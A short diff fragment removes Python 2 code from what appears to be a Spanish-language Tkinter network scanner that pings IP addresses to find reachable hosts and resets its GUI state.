-		ping = subprocess.Popen(["ping","-c 1",ip],stdout=PIPE,stderr=PIPE,stdin=PIPE)
-		ping_read = ping.stdout.read()
-		if re.findall("(\d) received",ping_read):
-			reply = int(re.findall("(\d) received",ping_read)[0])
-		else:
-			reply = False
-		if reply:
-			send_end.send(ip)
-		else:
-			send_end.send(False)
-
-	def escaneo(self):
-		Style().configure("Red.TButton", foreground="darkred")
-		if not self.escaneando:
-			self.escaneando = 1
-			self.Iinterfaces.escanear.config(style="Red.TButton")
-			for h in self.hosts:
-				if h.proceso:
-					h.proceso.terminate()
-					h.proceso = None
-			self.equipos_escaneo = []
-			self.hosts = []
-			if self.frame_equipos.winfo_children():
-				for widget in self.frame_equipos.winfo_children():
-	    				widget.destroy()
-			print "Escaneando "+self.Iinterfaces.combobox["values"][self.Iinterfaces.combobox.current()]+"...."
 
 init()
 		
